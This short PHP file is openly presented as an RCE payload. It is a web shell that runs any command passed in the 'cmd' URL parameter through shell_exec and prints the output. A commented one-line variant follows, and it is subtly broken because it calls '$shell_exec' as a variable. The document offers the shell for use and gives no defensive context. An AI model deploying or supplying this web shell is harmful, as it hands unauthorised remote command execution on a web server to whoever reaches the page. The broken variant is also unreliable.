<?php
// This is a basic PHP script that you can use as a payload for RCE

// Command to execute
$command = $_GET['cmd'];

// Execute the command
$output = shell_exec($command);

// Output the result
echo "<pre>$output</pre>";
?>

// or use this payload :-
// <?php echo"<pre>$shell_exec($_GET['cmd'])</pre>"?>